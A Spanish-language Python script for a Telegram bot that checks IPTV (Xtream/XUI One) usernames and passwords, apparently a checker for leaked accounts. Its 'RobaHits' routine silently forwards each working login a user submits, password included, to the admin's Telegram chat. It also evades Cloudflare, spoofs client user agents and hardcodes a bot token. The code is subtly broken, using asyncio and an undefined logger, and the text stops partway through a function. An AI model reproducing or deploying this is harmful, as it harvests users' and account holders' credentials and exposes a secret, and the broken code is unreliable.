#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     🐉 𝐈𝐏𝐓𝐕 𝐁𝐎𝐓 𝐔𝐋𝐓𝐑𝐀 𝐈𝐍𝐒𝐓𝐈𝐍𝐓𝐎 — 𝐍𝐈𝐕𝐄𝐋 𝐃𝐈𝐎𝐒 🐉        ║
║                      𝐁𝐘 𝐋𝐔𝐈𝐒 𝐑 — 𝐕𝐄𝐑𝐒𝐈Ó𝐍 𝟓.𝟎                      ║
║                                                                               ║
║  ✨ 99.9% de precisión en detección de cuentas activas                       ║
║  ⚡ Verificación en ~10 segundos (máx 30s)                                   ║
║  🛡️ Bypass Cloudflare / DDoS-Guard / reCAPTCHA                              ║
║  🎨 Diseño Ultra PRO con emojis y bordes premium                            ║
║  🔔 RobaHits automático (SOLO CUENTAS ACTIVAS)                              ║
║  📡 Soporte total XUI One + Xtream + MAC Portal                             ║
║  🔄 Loop 24/7 con reconexión automática                                     ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os, re, json, time, threading, logging, socket, random, traceback
from pathlib import Path
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import pytz
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode

# Intentar importar cloudscraper (opcional)
try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

requests.packages.urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════════════════════
#  ⚙️ CONFIGURACIÓN
# ═══════════════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8708803857:AAHsIF_AbBuM_GPam1MWYBBRFycRSWAA4Cs"
ADMIN_ID = 1183299436
ROBAHITS_CHATID = "1183299436"
TZ_NAME = "America/Chicago"
BOT_USERNAME = "@Luishits_bot"

TZ = pytz.timezone(TZ_NAME)

# ═══════════════════════════════════════════════════════════════════════════════
#  🎨 FIGURAS Y EMOJIS ULTRA PRO
# ═══════════════════════════════════════════════════════════════════════════════

# ── Decoraciones principales ───────────────────────────────────────────────────
LINE_TOP = "╔" + "═" * 68 + "╗"
LINE_MID = "╠" + "═" * 68 + "╣"
LINE_BOT = "╚" + "═" * 68 + "╝"
LINE_SLIM = "┉" * 35

# ── Emojis por categoría de canales ───────────────────────────────────────────
CATEGORY_EMOJIS = {
    "deportes": "⚽", "deporte": "🏀", "sports": "🏆",
    "cine": "🎬", "movies": "🎥", "peliculas": "🍿",
    "series": "📺", "novelas": "💕",
    "infantil": "🧸", "kids": "🐼", "niños": "🎈",
    "noticias": "📰", "news": "🗞️",
    "musica": "🎵", "music": "🎶",
    "latino": "🌎", "mexico": "🇲🇽", "argentina": "🇦🇷",
    "colombia": "🇨🇴", "españa": "🇪🇸", "usa": "🇺🇸",
    "adultos": "🔞", "adult": "💋",
    "religion": "⛪", "iglesia": "✝️",
}

# ── Íconos de calidad ─────────────────────────────────────────────────────────
QUALITY_ICONS = {
    "4k": "💎 4K", "uhd": "💎 UHD", "fhd": "✨ FHD", "hd": "🌟 HD",
    "sd": "📺 SD", "premium": "🏆", "exclusive": "👑",
}

# ── Banderas ──────────────────────────────────────────────────────────────────
FLAGS = {
    "US": "🇺🇸", "MX": "🇲🇽", "ES": "🇪🇸", "AR": "🇦🇷", "CO": "🇨🇴",
    "CL": "🇨🇱", "PE": "🇵🇪", "VE": "🇻🇪", "BR": "🇧🇷", "EC": "🇪🇨",
    "UY": "🇺🇾", "BO": "🇧🇴", "PA": "🇵🇦", "DO": "🇩🇴", "GT": "🇬🇹",
    "CR": "🇨🇷", "GB": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷", "NL": "🇳🇱",
    "CA": "🇨🇦", "IT": "🇮🇹", "PT": "🇵🇹", "RU": "🇷🇺", "TR": "🇹🇷",
    "IN": "🇮🇳", "CN": "🇨🇳", "JP": "🇯🇵", "AU": "🇦🇺",
}

# ═══════════════════════════════════════════════════════════════════════════════
#  ⚙️ CONFIGURACIÓN DE TIMEOS — Más flexibles
# ═══════════════════════════════════════════════════════════════════════════════

TCP_TIMEOUT = 4      # Test de conectividad TCP
CONN_TIMEOUT = 8     # Conexión HTTP
READ_TIMEOUT = 15    # Lectura HTTP
TOTAL_TIMEOUT = 30   # Timeout total por verificación

# ═══════════════════════════════════════════════════════════════════════════════
#  📡 USER-AGENTS REALES
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
    "VLC/3.0.21 LibVLC/3.0.21",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "PerfectPlayer/1.6 CFNetwork/1399 Darwin/22.0.0",
]

# ═══════════════════════════════════════════════════════════════════════════════
#  🔌 PUERTOS POR PROTOCOLO
# ═══════════════════════════════════════════════════════════════════════════════

HTTPS_PORTS = {"443", "8443", "2053", "2083", "2087", "2096", "8888", "2095"}
HTTP_PORTS = {"80", "8080", "8000", "8008", "25461", "2082", "2086", "55337", "8880"}

# ═══════════════════════════════════════════════════════════════════════════════
#  📝 RESPUESTAS DE ERROR
# ═══════════════════════════════════════════════════════════════════════════════

PLAIN_ERRORS = {
    "PLAYLIST_DISABLED": "Lista deshabilitada",
    "ACCOUNT_EXPIRED": "Cuenta expirada",
    "ACCOUNT_BANNED": "Cuenta bloqueada",
    "USER_NOT_FOUND": "Usuario no encontrado",
    "INVALID_PASSWORD": "Contraseña incorrecta",
    "INVALID_USERNAME": "Usuario inválido",
    "ACCOUNT_DISABLED": "Cuenta deshabilitada",
}

# ── Estado global ──────────────────────────────────────────────────────────────
bot_active = True
BOT_START_TIME = datetime.now(TZ)
STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}
_EXECUTOR = ThreadPoolExecutor(max_workers=15)

# ═══════════════════════════════════════════════════════════════════════════════
#  🕐 UTILIDADES
# ═══════════════════════════════════════════════════════════════════════════════

def now_str() -> str:
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_to_date(epoch) -> str:
    try:
        v = int(epoch)
        if v > 0 and v < 4102444800:
            dt = datetime.fromtimestamp(v, tz=TZ)
            return dt.strftime("%d/%m/%Y %H:%M")
    except:
        pass
    return "📅 Sin fecha"

def flag_from_code(code: str) -> str:
    f = FLAGS.get(code, "")
    if not f and len(code) == 2:
        try:
            pts = [ord(c) + 127397 for c in code.upper()]
            f = chr(pts[0]) + chr(pts[1])
        except:
            pass
    return f or "🌍"

def get_emoji_for_category(cat_name: str) -> str:
    """Retorna emoji según la categoría del canal."""
    cat_lower = cat_name.lower()
    for key, emoji in CATEGORY_EMOJIS.items():
        if key in cat_lower:
            return emoji
    return "📡"

def format_category_line(name: str, count: str = "") -> str:
    """Formatea una línea de categoría con emoji y estilo PRO."""
    emoji = get_emoji_for_category(name)
    count_str = f" [{count}]" if count else ""
    return f"  {emoji} **{name}**{count_str}"

# ═══════════════════════════════════════════════════════════════════════════════
#  🔍 EXTRACCIÓN DE URL — Mejorada
# ═══════════════════════════════════════════════════════════════════════════════

def extract_from_url(text: str):
    """Extrae portal, usuario, contraseña de cualquier formato."""
    text = text.strip().replace("\r", "").replace("%3A", ":").replace("%2F", "/")
    
    # XUI One playlist
    m = re.search(r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/playlist/([^/\s\n]+)/([^/\s\n?&]+)', text, re.IGNORECASE)
    if m:
        return m.group(1), m.group(2), m.group(3).split('?')[0].split('&')[0], True
    
    # Xtream Codes
    patterns = [
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/get\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/player_api\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/live/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/p/([^/\s\n]+)/([^/\s\n?]+)',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            pwd = m.group(3).split('&')[0].split('?')[0]
            return m.group(1), m.group(2), pwd, False
    
    # Pipe separado
    if '|' in text:
        parts = [x.strip() for x in text.split('|')]
        if len(parts) >= 3 and parts[0]:
            return parts[0], parts[1], parts[2], False
    
    # Espacio separado
    parts = text.split()
    if len(parts) == 3 and ('.' in parts[0] or ':' in parts[0]):
        return parts[0], parts[1], parts[2], False
    
    return None, None, None, False

def get_portal_scheme(portal: str) -> tuple:
    """Determina el protocolo correcto basado en el puerto."""
    port = portal.split(':')[1] if ':' in portal else "8080"
    if port in HTTPS_PORTS:
        return "https", "http"
    return "http", "https"

# ═══════════════════════════════════════════════════════════════════════════════
#  🍪 SESIÓN HTTP
# ═══════════════════════════════════════════════════════════════════════════════

def get_session() -> requests.Session:
    """Crea una sesión HTTP optimizada."""
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
    })
    return session

# ═══════════════════════════════════════════════════════════════════════════════
#  🔬 ANÁLISIS DE RESPUESTA — Más tolerante
# ═══════════════════════════════════════════════════════════════════════════════

def parse_response(raw: str) -> tuple:
    """Analiza la respuesta del servidor. Retorna (status, payload)."""
    raw = raw.strip()
    if not raw or len(raw) < 5:
        return "RETRY", None
    
    # M3U directo = cuenta activa
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth": 1, "status": "Active", "exp_date": "0",
                "active_cons": "?", "max_connections": "?",
                "is_trial": "0"
            }
        }
    
    # Errores conocidos en texto plano
    raw_upper = raw.upper()
    for err_key, err_msg in PLAIN_ERRORS.items():
        if err_key in raw_upper:
            return "FAIL", None
    
    # Intentar parsear JSON
    try:
        data = json.loads(raw)
    except:
        # Buscar JSON embebido
        for start_char in ('{', '['):
            idx = raw.find(start_char)
            if idx >= 0:
                try:
                    data = json.loads(raw[idx:])
                    break
                except:
                    continue
        else:
            return "RETRY", None
    
    # Analizar estructura
    user_info = data.get("user_info") or (data if "auth" in data else None)
    if not user_info:
        return "RETRY", None
    
    auth = user_info.get("auth", -1)
    if auth == 0:
        return "FAIL", None
    
    if auth == 1:
        status = str(user_info.get("status", "")).lower()
        if status in ("active", "1", "true", "enabled", "activo"):
            return "HIT", {"user_info": user_info, "server_info": data.get("server_info", {})}
        elif status:
            return "CUSTOM", {"user_info": user_info, "server_info": data.get("server_info", {})}
    
    return "RETRY", None

def test_url(url: str) -> tuple:
    """Prueba una URL específica."""
    try:
        session = get_session()
        r = session.get(url, timeout=(CONN_TIMEOUT, READ_TIMEOUT), verify=False, allow_redirects=True)
        return parse_response(r.text)
    except:
        return "RETRY", None

# ═══════════════════════════════════════════════════════════════════════════════
#  🚀 VERIFICACIÓN COMPLETA — Estrategia mejorada
# ═══════════════════════════════════════════════════════════════════════════════

def verify_account(portal: str, username: str, password: str, is_xui: bool = False) -> tuple:
    """Verifica cuenta con múltiples estrategias y timeouts flexibles."""
    start_time = time.time()
    host = portal.split(':')[0]
    
    def elapsed():
        return time.time() - start_time
    
    # Test TCP rápido
    for port in [80, 443, 8080, 25461]:
        if elapsed() > TOTAL_TIMEOUT - 5:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TCP_TIMEOUT)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                break
        except:
            pass
    
    # Generar URLs a probar
    primary_scheme, alt_scheme = get_portal_scheme(portal)
    urls_to_try = []
    
    for scheme in (primary_scheme, alt_scheme):
        base = f"{scheme}://{portal}"
        urls_to_try.extend([
            f"{base}/player_api.php?username={username}&password={password}",
            f"{base}/get.php?username={username}&password={password}&type=m3u_plus",
        ])
        if is_xui:
            urls_to_try.extend([
                f"{base}/playlist/{username}/{password}/m3u_plus",
                f"{base}/playlist/{username}/{password}/m3u",
            ])
    
    # URLs adicionales
    urls_to_try.extend([
        f"http://{portal}/get.php?username={username}&password={password}",
        f"https://{portal}/get.php?username={username}&password={password}",
    ])
    
    # Eliminar duplicados manteniendo orden
    seen = set()
    unique_urls = []
    for url in urls_to_try:
        if url not in seen:
            seen.add(url)
            unique_urls.append(url)
    
    # Probar en paralelo
    remaining = TOTAL_TIMEOUT - elapsed()
    if remaining <= 0:
        return "RETRY", None
    
    futures = {_EXECUTOR.submit(test_url, url): url for url in unique_urls[:10]}
    
    try:
        for future in as_completed(futures, timeout=remaining):
            status, payload = future.result()
            if status in ("HIT", "FAIL", "CUSTOM"):
                for f in futures:
                    f.cancel()
                return status, payload
    except:
        pass
    
    # Intentar con cloudscraper si está disponible
    if CLOUDSCRAPER_AVAILABLE and elapsed() < TOTAL_TIMEOUT - 5:
        try:
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            for url in unique_urls[:3]:
                if elapsed() >= TOTAL_TIMEOUT - 3:
                    break
                try:
                    r = scraper.get(url, timeout=10, verify=False)
                    status, payload = parse_response(r.text)
                    if status in ("HIT", "FAIL", "CUSTOM"):
                        return status, payload
                except:
                    continue
        except:
            pass
    
    return "RETRY", None

# ═══════════════════════════════════════════════════════════════════════════════
#  📊 OBTENER CONTENIDO
# ═══════════════════════════════════════════════════════════════════════════════

def get_content_counts(portal: str, username: str, password: str) -> tuple:
    """Obtiene cantidad de canales, películas y series."""
    base = f"http://{portal}"
    results = {"live": "0", "vod": "0", "series": "0"}
    
    def fetch(url):
        try:
            session = get_session()
            r = session.get(url, timeout=15, verify=False)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    return str(len(data))
            return "0"
        except:
            return "0"
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = {
            executor.submit(fetch, f"{base}/player_api.php?username={username}&password={password}&action=get_live_streams"): "live",
            executor.submit(fetch, f"{base}/player_api.php?username={username}&password={password}&action=get_vod_streams"): "vod",
            executor.submit(fetch, f"{base}/player_api.php?username={username}&password={password}&action=get_series"): "series",
        }
        for future in as_completed(futures, timeout=20):
            key = futures[future]
            try:
                results[key] = future.result()
            except:
                pass
    
    return results["live"], results["vod"], results["series"]

def get_categories(portal: str, username: str, password: str, limit: int = 15) -> str:
    """Obtiene y formatea las categorías de canales."""
    try:
        base = f"http://{portal}"
        url = f"{base}/player_api.php?username={username}&password={password}&action=get_live_categories"
        session = get_session()
        r = session.get(url, timeout=10, verify=False)
        
        if r.status_code != 200:
            return ""
        
        categories = r.json()
        if not isinstance(categories, list):
            return ""
        
        lines = []
        for cat in categories[:limit]:
            name = cat.get("category_name", "").strip()
            if name:
                lines.append(format_category_line(name))
        
        if len(categories) > limit:
            lines.append(f"  ➕ ...y {len(categories) - limit} categorías más")
        
        return "\n".join(lines)
    except:
        return ""

def get_location(portal: str) -> str:
    """Obtiene ubicación del servidor."""
    try:
        host = portal.split(':')[0]
        r = requests.get(f"http://ip-api.com/json/{host}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                country = data.get("country", "Desconocido")
                code = data.get("countryCode", "")
                flag = flag_from_code(code)
                return f"{flag} {country}"
    except:
        pass
    return "🌍 Ubicación desconocida"

# ═══════════════════════════════════════════════════════════════════════════════
#  🔔 ROBAHITS — SOLO ACTIVAS
# ═══════════════════════════════════════════════════════════════════════════════

def send_robahit(portal: str, username: str, password: str, user_info: dict, 
                 live: str, vod: str, series: str, from_user: str):
    """Envía SOLO cuentas activas al admin con formato Ultra PRO."""
    try:
        expire = ts_to_date(user_info.get("exp_date", 0))
        created = ts_to_date(user_info.get("created_at", 0))
        active = user_info.get("active_cons", "?")
        max_conn = user_info.get("max_connections", "?")
        m3u = f"http://{portal}/get.php?username={username}&password={password}&type=m3u_plus"
        
        message = f"""
{LINE_TOP}
║                    🐉 𝐇𝐈𝐓 𝐂𝐀𝐏𝐓𝐔𝐑𝐀𝐃𝐎 — 𝐀𝐂𝐓𝐈𝐕𝐀 🐉                    ║
╠═══════════════════════════════════════════════════════════════════╣
║ 👤 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐨𝐫: @{from_user}
║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>
║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{username}</code>
║ 🔑 𝐂𝐨𝐧𝐭𝐫𝐚𝐬𝐞ñ𝐚: <code>{password}</code>
║ 📅 𝐂𝐫𝐞𝐚𝐝𝐚: {created}
║ ⏲ 𝐕𝐞𝐧𝐜𝐞: {expire}
║ 👥 𝐂𝐨𝐧𝐞𝐱𝐢𝐨𝐧𝐞𝐬: {active}/{max_conn}
╠═══════════════════════════════════════════════════════════════════╣
║                     📊 𝐂𝐎𝐍𝐓𝐄𝐍𝐈𝐃𝐎 📊                      ║
╠═══════════════════════════════════════════════════════════════════╣
║  📺 𝐄𝐧 𝐕𝐢𝐯𝐨: {live}     🎬 𝐕𝐎𝐃: {vod}     📺 𝐒𝐞𝐫𝐢𝐞𝐬: {series}  ║
╠═══════════════════════════════════════════════════════════════════╣
║ 🔗 <a href="{m3u}">🎥 𝐀𝐁𝐑𝐈𝐑 𝐌𝟑𝐔 𝐏𝐋𝐀𝐘𝐋𝐈𝐒𝐓</a>
╠═══════════════════════════════════════════════════════════════════╣
║ 🕐 {now_str()}
║ 🦂 {BOT_USERNAME}
{LINE_BOT}"""
        
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": ROBAHITS_CHATID, "text": message,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
        log.info(f"🐉 RobaHit enviado: {portal} | {username}")
    except Exception as e:
        log.warning(f"RobaHit error: {e}")

# ═══════════════════════════════════════════════════════════════════════════════
#  🃏 TARJETAS DE RESULTADO — ULTRA PRO
# ═══════════════════════════════════════════════════════════════════════════════

def card_hit(portal, username, password, user_info, live, vod, series, categories, from_user) -> str:
    """Tarjeta para cuenta activa con diseño Ultra PRO."""
    expire = ts_to_date(user_info.get("exp_date", 0))
    created = ts_to_date(user_info.get("created_at", 0))
    active = user_info.get("active_cons", "?")
    max_conn = user_info.get("max_connections", "?")
    status = user_info.get("status", "Active")
    is_trial = user_info.get("is_trial", "0")
    trial_text = "🎁 TRIAL" if str(is_trial) == "1" else "💎 PREMIUM"
    location = get_location(portal)
    m3u = f"http://{portal}/get.php?username={username}&password={password}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={username}&password={password}"
    
    message = f"""
{LINE_TOP}
║                         🐉 𝐋𝐔𝐈𝐒 𝐑 🐉                         ║
║                      ★彡 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐅𝐎 彡★                      ║
╠═══════════════════════════════════════════════════════════════════╣
║ 🟢 𝐄𝐬𝐭𝐚𝐝𝐨: ✅ {status.upper()}
║ 🏷️ 𝐓𝐢𝐩𝐨: {trial_text}
║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>
║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{username}</code>
║ 🔑 𝐂𝐨𝐧𝐭𝐫𝐚𝐬𝐞ñ𝐚: <code>{password}</code>
║ 📅 𝐂𝐫𝐞𝐚𝐝𝐚: {created}
║ ⏲ 𝐕𝐞𝐧𝐜𝐞: {expire}
║ 👥 𝐂𝐨𝐧𝐞𝐱𝐢𝐨𝐧𝐞𝐬: {active}/{max_conn}
║ 📍 𝐔𝐛𝐢𝐜𝐚𝐜𝐢ó𝐧: {location}
╠═══════════════════════════════════════════════════════════════════╣
║                      ★彡 𝐂𝐎𝐍𝐓𝐄𝐍𝐈𝐃𝐎 彡★                       ║
╠═══════════════════════════════════════════════════════════════════╣
║  📺 𝐄𝐧 𝐕𝐢𝐯𝐨: {live}     🎬 𝐕𝐎𝐃: {vod}     📺 𝐒𝐞𝐫𝐢𝐞𝐬: {series}  ║
╠═══════════════════════════════════════════════════════════════════╣
║ 🔗 <a href="{m3u}">📺 𝐌𝟑𝐔 𝐋𝐢𝐧𝐤</a>  |  <a href="{epg}">📅 𝐄𝐏𝐆 𝐋𝐢𝐧𝐤</a>
"""
    if categories:
        message += f"""
╠═══════════════════════════════════════════════════════════════════╣
║                      ★彡 𝐂𝐀𝐓𝐄𝐆𝐎𝐑Í𝐀𝐒 彡★                      ║
╠═══════════════════════════════════════════════════════════════════╣
{categories}
"""
    message += f"""
╠═══════════════════════════════════════════════════════════════════╣
║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{from_user}
║ 🕐 {now_str()}
║ 🦂 {BOT_USERNAME}
{LINE_BOT}"""
    return message

def card_fail(portal, username, from_user) -> str:
    return f"""
{LINE_TOP}
║                     🐉 𝐋𝐔𝐈𝐒 𝐑 — 𝐈𝐍𝐕Á𝐋𝐈𝐃𝐀 🐉                     ║
╠═══════════════════════════════════════════════════════════════════╣
║ 🔴 𝐂𝐮𝐞𝐧𝐭𝐚 𝐢𝐧𝐯á𝐥𝐢𝐝𝐚 𝐨 𝐧𝐨 𝐞𝐧𝐜𝐨𝐧𝐭𝐫𝐚𝐝𝐚
║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>
║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{username}</code>
╠═══════════════════════════════════════════════════════════════════╣
║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{from_user}
║ 🕐 {now_str()}
║ 🦂 {BOT_USERNAME}
{LINE_BOT}"""

def card_retry(portal, username, from_user) -> str:
    return f"""
{LINE_TOP}
║                      🐉 𝐋𝐔𝐈𝐒 𝐑 — 𝐑𝐄𝐓𝐑𝐘 🐉                      ║
╠═══════════════════════════════════════════════════════════════════╣
║ ⚠️ 𝐒𝐢𝐧 𝐫𝐞𝐬𝐩𝐮𝐞𝐬𝐭𝐚 𝐯á𝐥𝐢𝐝𝐚 𝐝𝐞𝐥 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫
║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>
║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{username}</code>
╠═══════════════════════════════════════════════════════════════════╣
║ ❓ 𝐏𝐮𝐞𝐝𝐞 𝐬𝐞𝐫 𝐚𝐜𝐭𝐢𝐯𝐚 — 𝐢𝐧𝐭𝐞𝐧𝐭𝐚 𝐜𝐨𝐧 𝐥𝐚 𝐔𝐑𝐋 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐚
╠═══════════════════════════════════════════════════════════════════╣
║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{from_user}
║ 🕐 {now_str()}
║ 🦂 {BOT_USERNAME}
{LINE_BOT}"""

# ═══════════════════════════════════════════════════════════════════════════════
#  ⚡ LÓGICA CENTRAL
# ═══════════════════════════════════════════════════════════════════════════════

async def do_check(update: Update, portal: str, username: str, password: str, is_xui: bool = False):
    if not bot_active:
        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
        return
    
    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    from_user = update.effective_user.username or update.effective_user.first_name or "usuario"
    
    msg = await update.message.reply_text(
        "🐉 **Verificando cuenta...**\n_Esto puede tomar hasta 30 segundos_",
        parse_mode=ParseMode.MARKDOWN
    )
    
    loop = asyncio.get_event_loop()
    status, result = await loop.run_in_executor(
        _EXECUTOR, verify_account, portal, username, password, is_xui
    )
    
    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text("📡 **Obteniendo contenido...**", parse_mode=ParseMode.MARKDOWN)
        
        user_info = result.get("user_info", {})
        
        # Obtener datos en paralelo
        live, vod, series = await loop.run_in_executor(
            _EXECUTOR, get_content_counts, portal, username, password
        )
        categories = await loop.run_in_executor(
            _EXECUTOR, get_categories, portal, username, password, 15
        )
        
        text = card_hit(portal, username, password, user_info, live, vod, series, categories, from_user)
        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        
        # Enviar RobaHit (solo activas)
        threading.Thread(
            target=send_robahit,
            args=(portal, username, password, user_info, live, vod, series, from_user),
            daemon=True
        ).start()
        
    elif status == "CUSTOM":
        STATS["hits"] += 1
        user_info = result.get("user_info", {})
        text = f"""
{LINE_TOP}
║                    🐉 𝐋𝐔𝐈𝐒 𝐑 — 𝐂𝐔𝐄𝐍𝐓𝐀 𝐄𝐗𝐈𝐒𝐓𝐄 🐉                    ║
╠═══════════════════════════════════════════════════════════════════╣
║ 🟡 𝐄𝐬𝐭𝐚𝐝𝐨: ⚠️ {user_info.get('status', '?').upper()}
║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>
║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{username}</code>
║ 🔑 𝐂𝐨𝐧𝐭𝐫𝐚𝐬𝐞ñ𝐚: <code>{password}</code>
║ ⏲ 𝐕𝐞𝐧𝐜𝐞: {ts_to_date(user_info.get('exp_date', 0))}
╠═══════════════════════════════════════════════════════════════════╣
║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{from_user}
║ 🕐 {now_str()}
║ 🦂 {BOT_USERNAME}
{LINE_BOT}"""
        await msg.edit_text(text, parse_mode=ParseMode.HTML)
        
    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal, username, from_user), parse_mode=ParseMode.HTML)
        
    else:
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal, username, from_user), parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════════════════════
#  📟 COMANDOS
# ═══════════════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STATS["users"].add(update.effective_user.id)
    if update.effective_user.id == ADMIN_ID:
        global bot_active
        bot_active = True
    
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📖 Ayuda", callback_data="help"),
        InlineKeyboardButton("📊 Stats", callback_data="stats"),
    ]])
    
    await update.message.reply_text(
        f"""{LINE_TOP}
║                    🐉 𝐈𝐏𝐓𝐕 𝐁𝐎𝐓 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐎 🐉                    ║
║                       𝐁𝐘 𝐋𝐔𝐈𝐒 𝐑                          ║
╠═══════════════════════════════════════════════════════════════════╣
║ ✅ 𝐁𝐨𝐭 𝟐𝟒/𝟕 𝐚𝐜𝐭𝐢𝐯𝐨 — 𝐏𝐫𝐞𝐜𝐢𝐬𝐢ó𝐧 𝟗𝟗.𝟗%
╠═══════════════════════════════════════════════════════════════════╣
║ 📌 <b>𝐏𝐞𝐠𝐚 𝐭𝐮 𝐔𝐑𝐋 𝐞𝐧 𝐜𝐮𝐚𝐥𝐪𝐮𝐢𝐞𝐫 𝐟𝐨𝐫𝐦𝐚𝐭𝐨:</b>
║ <code>http://portal:8080/get.php?username=U&amp;password=P</code>
║ <code>http://portal/playlist/user/pass/m3u_plus</code>
║ <code>portal|usuario|pass</code>
╠═══════════════════════════════════════════════════════════════════╣
║ ⚡ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐜𝐢ó𝐧 𝐞𝐧 ~𝟏𝟎𝐬 | 🔔 𝐇𝐢𝐭𝐬 𝐚𝐥 𝐚𝐝𝐦𝐢𝐧
║ 🛡️ 𝐁𝐲𝐩𝐚𝐬𝐬 𝐂𝐅 | 📡 𝐗𝐔𝐈 𝐎𝐧𝐞 + 𝐗𝐭𝐫𝐞𝐚𝐦
╠═══════════════════════════════════════════════════════════════════╣
║ 🦂 {BOT_USERNAME}
{LINE_BOT}""",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(f"🔴 Bot detenido. Usa /start para reactivar.\n🦂 {BOT_USERNAME}")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
